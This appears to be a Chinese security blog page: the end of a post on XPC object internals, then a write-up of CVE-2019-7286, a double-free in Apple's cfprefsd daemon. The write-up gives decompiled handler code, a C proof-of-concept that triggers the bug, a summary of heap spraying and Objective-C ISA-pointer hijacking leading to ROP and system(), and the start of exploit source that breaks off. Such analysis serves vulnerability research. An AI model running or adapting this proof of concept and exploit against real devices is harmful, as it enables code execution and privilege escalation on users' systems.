<p><img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_264378524.img.jpeg/1544748152434/look-into-xpc-internals-image-sec9-3.jpeg"></p>
<p>我们可以确定 XPC 字典链表条目的结构如下：</p>
<p><img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_77767368.img.png/1544748161911/look-into-xpc-internals-image16.png"></p>
<p>xpc_dictionary_t对象的结构如下：</p>
<p><img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_2107031769.img.png/1545096126035/replaced-figure.png"></p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>XPC 还提供了<em>xpc_copy_description(xpc_object_t)</em> API 用于生成任何 XPC 对象的人类可读的字符串描述，这对于转储消息特别有用。例如，当我们使用给定的 xpc_dictionary_t 对象参数调用此 API 时，以下是此 xpc_dictionary_t 对象的字符串描述的输出。通过它很容易识别出这个对象的内部元素的值。</p>
<p><img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_1086093663.img.png/1545096299370/new-image-bottom.png"></p>
<p>在xpc_copy_description(xpc_object_t)的实现中，可以调用描述函数（<code>_xpc_TYPE_desc</code>或<code>_xpc_TYPE_debug_desc</code>）来获得这个XPC对象的字符串描述。这两个描述函数的地址分别位于相应的<code>_OS_xpc_TYPE</code>类中的偏移量0x58和0x60，如下所示：</p>
<p><img src="https://www.fortinet.com/blog/threat-research/a-look-into-xpc-internals--reverse-engineering-the-xpc-objects/_jcr_content/root/responsivegrid/image_330394836.img.png/1545096364031/new-image-bottom-two.png"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2021/12/15/Apple-cfprefsd%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/12/15/Apple-cfprefsd%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">Apple cfprefsd漏洞</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-12-15 21:26:42" itemprop="dateCreated datePublished" datetime="2021-12-15T21:26:42+08:00">2021-12-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-10-11 20:54:39" itemprop="dateModified" datetime="2022-10-11T20:54:39+08:00">2022-10-11</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>本文章汇总整理一下在<strong>cfprefsd</strong>中出现的漏洞。</p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="cfprefsd是什么"><a href="#cfprefsd是什么" class="headerlink" title="cfprefsd是什么"></a>cfprefsd是什么</h2><p>cfprefsd是CoreFoundation中的一个XPC服务，它能够通过用户请求读写偏好文件(即plist)。cfprefsd通常有两个运行的实例，一个负责以用户权限运行的应用程序设置首选项；另一个以root身份运行，负责系统范围的设置首选项。任何进程都可以打开与两个cfprefsd进程中的任何一个的XPC连接。</p>
<p>cfprefsd没有被沙箱隔离，因此可以从应用程序和WebContent沙箱直接访问。</p>
<p>cfprefsd二进制文件是一个Stub，主要是包含CoreFoundation框架中的CFXPreferencesDaemon_main的一个分支。CFXPreferencesDaemon_main分配一个CFPrefsDaemon对象，该对象创建一个在默认并发队列上进行监听的一个com.apple.cfprefsd.daemon（XPC服务），为每一个传入连接提供一个replyHandler来执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">[CFPrefsDaemon initWithRole:role testMode] &#123;</span><br><span class="line">  ...</span><br><span class="line">  listener =</span><br><span class="line">    xpc_connection_create_mach_service(&quot;com.apple.cfprefsd.daemon&quot;,</span><br><span class="line">                                       0,</span><br><span class="line">                                       XPC_CONNECTION_MACH_SERVICE_LISTENER);</span><br><span class="line">  // 事件处理</span><br><span class="line">  xpc_connection_set_event_handler(listener, ^(xpc_object_t peer) &#123;</span><br><span class="line">    if (xpc_get_type(peer) == XPC_TYPE_CONNECTION) &#123;</span><br><span class="line">      // 处理 XPC_TYPE_CONNECTION</span><br><span class="line">      xpc_connection_set_event_handler(peer, ^(xpc_object_t obj) &#123;</span><br><span class="line">        if (xpc_get_type(obj) == XPC_TYPE_DICTIONARY) &#123;</span><br><span class="line">          context_obj = xpc_connection_get_context(peer);</span><br><span class="line">          cfprefsd = context_obj.cfprefsd;</span><br><span class="line">          [cfprefsd handleMessage:obj fromPeer:peer replyHandler:</span><br><span class="line">            ^(xpc_object_t reply)</span><br><span class="line">            &#123;</span><br><span class="line">              xpc_connection_send_message(peer, reply);</span><br><span class="line">            &#125;];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      // 队列</span><br><span class="line">      char label[0x80];</span><br><span class="line">      pid_t pid = xpc_connection_get_pid(peer)</span><br><span class="line">      dispatch_queue_t queue;</span><br><span class="line">      int label_len = snprintf(label, 0x80, &quot;Serving PID %d&quot;, pid);</span><br><span class="line">      if (label_len &gt; 0x7e) &#123;</span><br><span class="line">        queue = NULL;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        queue = dispatch_queue_create(label, NULL);</span><br><span class="line">      &#125;</span><br><span class="line">      xpc_connection_set_target_queue(peer, queue);</span><br><span class="line"></span><br><span class="line">      context_obj = [[CFPrefsClientContext alloc] init];</span><br><span class="line">      context_obj.lock = 0;</span><br><span class="line">      context_obj.cfprefsd = self; // the CFPrefsDaemon object</span><br><span class="line">      context_obj.isPlatformBinary = -1; // char</span><br><span class="line">      context_obj.valid = 1;</span><br><span class="line">      xpc_connection_set_context(peer, context_obj);</span><br><span class="line">      xpc_connection_set_finalizer(peer, client_context_finalizer)</span><br><span class="line">      xpc_connection_resume(peer);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><h2 id="CVE-2019-7286"><a href="#CVE-2019-7286" class="headerlink" title="CVE-2019-7286"></a>CVE-2019-7286</h2><blockquote>
<p>在iOS 12.1.4中修复，适用于iPhone 5s 及更新机型、iPad Air 及更新机型以及第 6 代 iPod touch</p>
</blockquote>
<p>如前言中所述，cfprefsd是通过[CFPrefsDaemon handleMessage:fromPeer:replyHandler:]来处理传入连接的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">-[CFPrefsDaemon handleMessage:msg fromPeer:peer replyHandler: handler] &#123;</span><br><span class="line">  if (xpc_get_type(msg) == XPC_TYPE_ERROR) &#123;</span><br><span class="line">    [self handleError:msg]</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    xpc_dictionary_get_value(msg, &quot;connection&quot;, peer);</span><br><span class="line">    uint64_t op = xpc_dictionary_get_uint64(msg, &quot;CFPreferencesOperation&quot;);</span><br><span class="line">    switch (op) &#123;</span><br><span class="line">     case 1:</span><br><span class="line">     case 7:</span><br><span class="line">     case 8:</span><br><span class="line">      [self handleSourceMessage:msg replyHandler:handler];</span><br><span class="line">      break;</span><br><span class="line">     case 2:</span><br><span class="line">      [self handleAgentCheckInMessage:msg replyHandler:handler];</span><br><span class="line">      break;</span><br><span class="line">     case 3:</span><br><span class="line">      [self handleFlushManagedMessage:msg replyHandler:handler];</span><br><span class="line">      break;</span><br><span class="line">     case 4:</span><br><span class="line">      [self handleFlushSourceForDomainMessage:msg replyHandler:handler];</span><br><span class="line">      break;</span><br><span class="line">     case 5:</span><br><span class="line">      [self handleMultiMessage:msg replyHandler:handler];</span><br><span class="line">      break;</span><br><span class="line">     case 6:</span><br><span class="line">      [self handleUserDeletedMessage:msg replyHandler:handler];</span><br><span class="line">      break;</span><br><span class="line">     default:</span><br><span class="line">      // send error reply</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>问题出在case 5: handleMultiMessage上，处理xpc_array类型：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">-[CFPrefsDaemon handleMultiMessage:msg replyHandler: handler]</span><br><span class="line">&#123;</span><br><span class="line">  xpc_object_t peer = xpc_dictionary_get_remote_connection(msg);</span><br><span class="line">  // ...</span><br><span class="line">  xpc_object_t messages = xpc_dictionary_get_value(msg, &quot;CFPreferencesMessages&quot;);</span><br><span class="line">  if (!messages || xpc_get_type(messages) != OS_xpc_array) &#123;</span><br><span class="line">    // send error message</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // 如果只包含dictionaries或null, 直接返回</span><br><span class="line">  bool all_types_valid = xpc_array_apply(messages, ^(xpc_object_t entry) &#123;</span><br><span class="line">    xpc_type_t type = xpc_get_type(entry);</span><br><span class="line">    return (type == XPC_TYPE_DICTIONARY || type == XPC_TYPE_NULL)</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  if (!all_types_valid) &#123;</span><br><span class="line">    // return error</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  size_t n_sub_messages = xpc_array_get_count(messages);</span><br><span class="line"></span><br><span class="line">  // macro from CFInternal.h</span><br><span class="line">  // allocates either on the stack or heap</span><br><span class="line">  new_id_array(sub_messages, n_sub_messages);</span><br><span class="line"></span><br><span class="line">  if (n_sub_messages &gt; 0) &#123;</span><br><span class="line">    for (size_t i = 0; i &lt; n_sub_messages; i++) &#123;</span><br><span class="line">      // raw pointers, not holding a reference</span><br><span class="line">      sub_messages[i] = xpc_array_get_value(messages, i);  // &lt;--- 1</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (size_t i = 0; i &lt; n_sub_messages; i++) &#123;</span><br><span class="line">      if (xpc_get_type(sub_messages[i]) == XPC_TYPE_DICTIONARY) &#123;</span><br><span class="line">        [self handleMessage: sub_messages[i]  // &lt;--- 2</span><br><span class="line">              fromPeer: peer</span><br><span class="line">              replyHandler: ^(xpc_object_t reply) &#123;</span><br><span class="line">                sub_messages[i] = xpc_retain(reply);  // &lt;--- 3</span><br><span class="line">              &#125;];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  xpc_object_t reply = xpc_dictionary_create_reply(msg);  // &lt;--- 4</span><br><span class="line">  xpc_object_t replies_arr = xpc_array_create(sub_messages, n_sub_messages);</span><br><span class="line">  xpc_dictionary_set_value(reply, &quot;CFPreferencesMessages&quot;, replies_arr);</span><br><span class="line"></span><br><span class="line">  xpc_release(replies_arr);</span><br><span class="line"></span><br><span class="line">  if (n_sub_messages) &#123;</span><br><span class="line">    for (size_t i = 0; i &lt; n_sub_messages; i++) &#123;</span><br><span class="line">      if (xpc_get_type(sub_messages[i]) != XPC_TYPE_NULL) &#123;</span><br><span class="line">        xpc_release(sub_messages[i]);  // &lt;--- 5</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  free_id_array(sub_messages);</span><br><span class="line"></span><br><span class="line">  handler(reply);</span><br><span class="line"></span><br><span class="line">  xpc_release(reply);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如上所示，在第1步中，适用xpc_array_get_value函数将内容从xpc_array中取出，放入sub_messages中。第2步，将sub_messages传给handleMessage()函数处理所有子消息。第3步，将sub_messages中的每一个值改变为reply消息（这是一个引用）。第4步，当所有的子消息被处理后，根据所有的回复中创建一个xpc_array，在59行调用相应的replyHandler，处理所有子消息的reply消息。</p>
<p>问题是，不是所有的消息类型都会有reply，就是指这些消息不会调用replyHandler函数。正如第3步中显示的那样，对于这些不reply的消息，一般采用的处理方式是NOP掉。通过查询开发者手册可知，xpc_release()函数将减少对象的引用，xpc_array_get_value()函数用于获取指定下标中的值：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xpc_release</span><br><span class="line">Decrements the reference count of an object.</span><br><span class="line"></span><br><span class="line">xpc_array_get_value(_:_:)</span><br><span class="line">Returns the value at the specified index in the array.</span><br></pre></td></tr></table></figure>

<p>这里设计的本意是通过xpc_retain()函数，改变sub_messages[i]中的值，也就是sub_messages[i]中的值变为了引用，这样后面在xpc_release()函数解引用时就能匹配上；否则，就会在释放<strong>CFPreferencesMessages</strong>数组时，由于引用已经被释放了，导致出现<strong>double-free</strong>。</p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>触发漏洞的键值：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">poc_dict = &#123;</span><br><span class="line">  <span class="string">&quot;CFPreferencesOperation&quot;</span> = 5,</span><br><span class="line">  <span class="string">&quot;CFPreferencesMessages&quot;</span> = [</span><br><span class="line">    &#123;</span><br><span class="line">     <span class="string">&quot;CFPreferencesOperation&quot;</span>: 4  </span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>具体POC：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> ;</span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> &#123;</span><br><span class="line"> </span><br><span class="line">  <span class="type">xpc_connection_t</span> conn = xpc_connection_create_mach_service(<span class="string">&quot;com.apple.cfprefsd.daemon&quot;</span>,<span class="number">0</span>,XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);</span><br><span class="line">  xpc_connection_set_event_handler(conn, ^(<span class="type">xpc_object_t</span> t) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;got message: %sn&quot;</span>, xpc_copy_description(t));</span><br><span class="line">  &#125;);</span><br><span class="line"> </span><br><span class="line">  xpc_connection_resume(conn);</span><br><span class="line"> </span><br><span class="line">  <span class="type">xpc_object_t</span> hello = xpc_dictionary_create(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">  xpc_dictionary_set_int64(hello, <span class="string">&quot;CFPreferencesOperation&quot;</span>, <span class="number">5</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="type">xpc_object_t</span> arr = xpc_array_create(<span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="type">xpc_object_t</span> arr_elem1 = xpc_dictionary_create(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">  xpc_dictionary_set_int64(arr_elem1, <span class="string">&quot;CFPreferencesOperation&quot;</span>, <span class="number">4</span>);</span><br><span class="line"> </span><br><span class="line">  xpc_array_append_value(arr, arr_elem1);</span><br><span class="line">  xpc_dictionary_set_value(hello, <span class="string">&quot;CFPreferencesMessages&quot;</span>, arr);</span><br><span class="line">  xpc_connection_send_message(conn, hello);</span><br><span class="line">  xpc_release(hello);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用-ZecOps"><a href="#漏洞利用-ZecOps" class="headerlink" title="漏洞利用 - ZecOps"></a>漏洞利用 - ZecOps</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>这里使用两个线程，一个用于触发漏洞，一个用于填充内存空间。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">+----------------+       +---------------+</span><br><span class="line">|   vul_thread   |       |  fill_thread  |</span><br><span class="line">|                |       |               |</span><br><span class="line">| +------------+ |       |               |</span><br><span class="line">| | first free | |       |               |</span><br><span class="line">| |            | |       |               |</span><br><span class="line">| +-----+------+ |       |               |</span><br><span class="line">|       |        |       |  +----------+ |</span><br><span class="line">|       |        |       |  | allocate | |</span><br><span class="line">|       +&lt;------------------+          | |</span><br><span class="line">|       |        |       |  +----------+ |</span><br><span class="line">| +-----v------+ |       |               |</span><br><span class="line">| | double free| |       |               |</span><br><span class="line">| |            | |       |               |</span><br><span class="line">| +------------+ |       |               |</span><br><span class="line">|                |       |               |</span><br><span class="line">+----------------+       +---------------+</span><br></pre></td></tr></table></figure>

<h4 id="Double-Free转Use-After-Free"><a href="#Double-Free转Use-After-Free" class="headerlink" title="Double-Free转Use-After-Free"></a>Double-Free转Use-After-Free</h4><p>两次 xpc_release 之间的时间窗口会很短，由于XPC请求是可控的，我们可以创建一个很大的xpc_array，来获取足够的时间窗口去填充释放的内存。</p>
<p>接下来是要寻找一个合适的填充对象，该对象应该满足以下几点：</p>
<ol>
<li>可以控制前8个字节，允许控制ISA指针</li>
<li>对象的大小应该是0xc0——与释放的xpc_dictionary_t相同，更有可能填满释放的内存</li>
<li>应该可以控制内存分配，提高填充率</li>
</ol>
<p>这里选择的是OS_xpc_string，在反序列化 OS_xpc_string 时，函数 xpc_string_deserialize 调用 xpc_try_strdup（封装的strdup()函数）。通过控制字符串的长度，可以控制分配的大小。将多个 OS_xpc_string 对象添加到反序列化的字典或数组中也可能会增加填充率。长度为 0xc0 的字符串能达到超过 60% 的填充释放对象的成功率。</p>
<h4 id="控制PC"><a href="#控制PC" class="headerlink" title="控制PC"></a>控制PC</h4><p>Object-C 对象的前 8 个字节是 ISA 指针。将 ISA 指针指向一个受控的内存空间可以让我们控制 Object-C 的方法调用，这里可以参考<a target="_blank" rel="noopener" href="http://phrack.org/issues/69/9.html#article">Modern Objective-C Exploitation Techniques</a>。</p>
<p>下一个问题是要解决ASLR，这里是通过堆喷来实现的，可以参考Ian Beer的<a target="_blank" rel="noopener" href="https://thecyberwire.com/events/docs/IanBeer_JSS_Slides.pdf">Auditing and Exploiting Apple IPC</a>。</p>
<p>堆喷的数据是在VM_ALLOCATE区域，可以在 0x180202000 可靠地找到。由于字符串截断机制，我们需要稍微移动数据，使用 0x180202020 而不是 0x180202000。如果我们使用 0x180202000，作为字符串的第一个字节的第一个空字节将终止字符串。</p>
<p>但是，控制PC以后的成功率反而降低了，从60%+ 下降到 5%-，原因是在64位中，0x180202020实际是0x0000000180202020，字符串将在第五个字节处截断，由于OS X使用基于大小的空闲列表来加速分配，字符串可能会分配到其他地方。</p>
<p>在控制PC之后，我们可以构造一个payload来做Return Oriented Programming，通过调用system()或者像Brandon的<a target="_blank" rel="noopener" href="https://bazad.github.io/2018/11/introduction-userspace-race-conditions-ios/">An introduction to exploiting userspace race conditions on iOS</a>那样获取cfprefsd的任务端口来执行任意命令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;xpc/xpc.h&gt;</span><br><span class="line">#import &lt;pthread.h&gt;</span><br><span class="line">#include &lt;mach/mach.h&gt;</span><br><span class="line">#include &lt;mach/task.h&gt;</span><br><span class="line">#include &lt;dlfcn.h&gt;</span><br><span class="line">#include &lt;mach-o/dyld_images.h&gt;</span><br><span class="line">#include &lt;objc/runtime.h&gt;</span><br><span class="line"> </span><br><span class="line">#define AGENT 1</span><br><span class="line"> </span><br><span class="line">#define FILL_DICT_COUNT 0x600</span><br><span class="line">#define FILL_COUNT 0x1000</span><br><span class="line">#define FREE_COUNT 0x2000</span><br><span class="line">#define FILL_SIZE (0xc0)</span><br><span class="line"> </span><br><span class="line">int need_stop = 0;</span><br><span class="line"> </span><br><span class="line">struct heap_spray &#123;</span><br><span class="line">    void* fake_objc_class_ptr;</span><br><span class="line">    uint32_t r10;</span><br><span class="line">    uint32_t r4;</span><br><span class="line">    void* fake_sel_addr;</span><br><span class="line">    uint32_t r5;</span><br><span class="line">    uint32_t r6;</span><br><span class="line">    uint64_t cmd;</span><br><span class="line">    uint8_t pad1[0x3c];</span><br><span class="line">    uint32_t stack_pivot;</span><br><span class="line">    struct fake_objc_class_t &#123;</span><br><span class="line">        char pad[0x8];</span><br><span class="line">        void* cache_buckets_ptr;</span><br><span class="line">        uint32_t cache_bucket_mask;</span><br><span class="line">    &#125; fake_objc_class;</span><br><span class="line">    struct fake_cache_bucket_t &#123;</span><br><span class="line">        void* cached_sel;</span><br><span class="line">        void* cached_function;</span><br><span class="line">    &#125; fake_cache_bucket;</span><br><span class="line">    char command[32];</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">void fill_once()&#123;</span><br><span class="line">   </span><br><span class="line">#if AGENT</span><br><span class="line">    xpc_connection_t client = xpc_connection_create_mach_service(&quot;com.apple.cfprefsd.agent&quot;,0,0);</span><br><span class="line">#else</span><br><span class="line">    xpc_connection_t client = 